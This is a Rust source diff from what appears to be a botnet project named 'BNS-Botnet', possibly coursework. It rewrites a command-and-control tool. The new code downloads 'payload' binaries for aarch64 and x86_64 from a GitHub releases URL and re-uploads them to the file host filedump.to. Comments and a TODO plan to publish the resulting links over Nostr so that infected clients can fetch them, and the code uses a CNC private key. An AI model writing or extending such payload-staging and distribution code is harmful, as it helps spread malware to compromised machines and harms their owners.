@@ -1,55 +1,93 @@
+use std::collections::HashMap;
+
 use bns_lib::FILE_STORAGE_SERVER;
+use bytes::Bytes;
 use nostr_sdk::Client;
 use nostr_sdk::prelude::*;
-use std::env;
-use std::fs::File;
-use std::io::Read;
+use reqwest::Client as RClient;
+use reqwest::multipart::Form;
+use reqwest::multipart::Part;
+
+mod payload;
+
+const ARCHS: [&'static str; 2] = ["aarch64", "x86_64"];
+const REPO: &'static str = "https://github.com/SenneW-2158088/BNS-Botnet/releases/download/main";
+const PAYLOAD: &'static str = "payload";
+const FILEDUMP: &'static str = "https://filedump.to/";
 
 const RELAYS: [&str; 1] = [bns_lib::RELAY];
 
+async fn download_payload(client: &RClient, architecture: &str) -> Result<Bytes, ()> {
+    let url = format!("{}/{}-{}", REPO, PAYLOAD, architecture);
+    let response = client.get(url).send().await.map_err(|e| ())?;
+    let payload = response.bytes().await.map_err(|e| ())?;
+
+    Ok(payload)
+}
+
 async fn run() -> Result<()> {
-    let args: Vec<String> = env::args().collect();
-    if args.len() != 2 {
-        eprintln!("Usage: {} <file_path>", args[0]);
-        std::process::exit(1);
-    }
+    let client = RClient::new();
 
-    let file_path = &args[1];
-    let mut file = match File::open(file_path) {
-        Ok(file) => file,
-        Err(e) => {
-            eprintln!("Failed to open file: {}", e);
-            std::process::exit(1);
+    let mut payloads: HashMap<String, Bytes> = HashMap::new();
+
+    println!("[i] Downloading payloads from github");
+    for architecture in ARCHS {
+        match download_payload(&client, architecture).await {
+            Ok(payload) => {
+                println!("[+] Downloaded payload for {}", architecture);
+                payloads.insert(architecture.to_string(), payload);
+            }
+            Err(_) => println!("[-] Error getting payload for {}", architecture),
         }
-    };
-
-    let mut contents = Vec::new();
-    if let Err(e) = file.read_to_end(&mut contents) {
-        eprintln!("Failed to read file: {}", e);
-        std::process::exit(1);
     }
 
-    let keys: Keys = Keys::parse(bns_lib::CNC_PRIVATE_KEY)?;
+    println!("[i] Publishing payloads on filedump");
+    let mut filedump_urls: HashMap<String, String> = HashMap::new();
 
-    let connection: Connection = Connection::new();
-    let opts = Options::new().connection(connection);
+    for (architecture, payload) in payloads {
+        let form = Form::new().part("file", Part::bytes(payload.to_vec()));
 
-    let client = Client::builder().signer(keys.clone()).opts(opts).build();
+        match client.post(FILEDUMP).multipart(form).send().await {
+            Ok(response) => {
+                let body = response.text().await.unwrap();
+                println!("[+] Got body {}", body);
+            }
+            Err(_) => println!(
+                "[-] Error uploading to filedump for architecture {}",
+                architecture
+            ),
+        }
+    }
 
-    // uploading file
-    println!("[+] server_config");
+    // Nu nog die url's serializen en uitprinten zodat we dit in een post kunnen steken
 
-    let server_config = nip96::get_server_config(Url::parse(bns_lib::FILE_STORAGE_SERVER)?, None).await?;
+    // let keys: Keys = Keys::parse(bns_lib::CNC_PRIVATE_KEY)?;
 
-    println!("[+] allowed mimetypes: {:?}", server_config.content_types);
-    println!("[+] server config: {:?}", server_config);
-    
-    println!("[+] uploading data...");
+    // let connection: Connection = Connection::new();
+    // let opts = Options::new().connection(connection);
+    // let client = Client::builder().signer(keys.clone()).opts(opts).build();
 
-    let url = nip96::upload_data(&client.signer().await?, &server_config, contents, Some("text/plain"), None).await?;
+    // // uploading file
+    // println!("[+] server_config");
 
-    println!("url: {}", url);
-    
+    // let server_config =
+    //     nip96::get_server_config(Url::parse(bns_lib::FILE_STORAGE_SERVER)?, None).await?;
+
+    // println!("[+] allowed mimetypes: {:?}", server_config.content_types);
+
+    // println!("[+] uploading data...");
+
+    // let url = nip96::upload_data(
+    //     &client.signer().await?,
+    //     &server_config,
+    //     contents,
+    //     Some("text/plain"),
+    //     None,
+    // )
+    // .await?;
+
+    // println!("url: {}", url);
+
     // TODO: upload this url as a note, such that clients can find it
 
     // match client.upload_file(file_path, &contents) {
